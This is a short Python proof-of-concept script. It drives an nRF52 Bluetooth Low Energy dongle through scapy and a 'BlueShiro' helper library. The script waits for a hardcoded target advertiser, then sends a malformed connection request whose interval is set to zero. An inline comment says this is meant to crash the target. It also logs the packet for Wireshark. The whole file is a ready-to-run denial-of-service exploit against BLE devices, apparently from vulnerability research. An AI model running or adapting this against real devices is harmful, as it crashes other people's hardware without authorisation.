import os
import sys
from threading import Timer
from time import sleep

sys.path.insert(0, os.getcwd() + '/libs')
from scapy.layers.bluetooth4LE import *
from BlueShiro import BlueShiro
from colorama import Fore

master_address = "70:a6:cc:b5:92:70"
phone_address = "fc:a9:f5:45:42:5a"
advertiser_address = "a4:c1:38:7d:ab:b9"
access_address = 0x9a328370
serial_port = "/dev/ttyACM0"

blueShiro = BlueShiro(master_address, serial_port, advertiser_address)

scan_req = BTLE() / BTLE_ADV(RxAdd=blueShiro.slave_addr_type) / BTLE_SCAN_REQ(
    ScanA=master_address,
    AdvA=advertiser_address)
blueShiro.send(scan_req)
blueShiro.scan_timer.start()

print(Fore.GREEN + 'Waiting adv from ' + advertiser_address)
while True:
    pkt = None
    data = blueShiro.driver.raw_receive()
    if data:
        pkt = BTLE(data)
        if pkt is None:
            blueShiro.none_count += 1
            if blueShiro.none_count >= 3:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue
        elif blueShiro.connected and BTLE_EMPTY_PDU not in pkt:
            print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
        
        if pkt and (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) and pkt.AdvA == advertiser_address.lower() and blueShiro.connecting == False:
            blueShiro.connecting = True
            blueShiro.slave_addr_type = pkt.TxAdd
            print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')

            conn_req = BTLE() / BTLE_ADV(RxAdd=blueShiro.slave_addr_type, TxAdd=blueShiro.master_addr_type) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  
                crc_init=0x179a9c,  
                win_size=2,  
                win_offset=2, 
                interval=16,  
                latency=0,  
                timeout=50, 
                # ---------------------28 Bytes until here--------------------------
                chM=0x1FFFFFFFFF,
                hop=5,  
                SCA=0
            )
            conn_req[BTLE_CONNECT_REQ].interval = 0  # Clearing the interval time triggers the crash.
            blueShiro.send(conn_req)
            blueShiro.save2wireshark("conn_req_crash", conn_req)
            print(Fore.YELLOW + 'Malformed connection request was sent')
            blueShiro.crash_prompt()

    sleep(0.1)


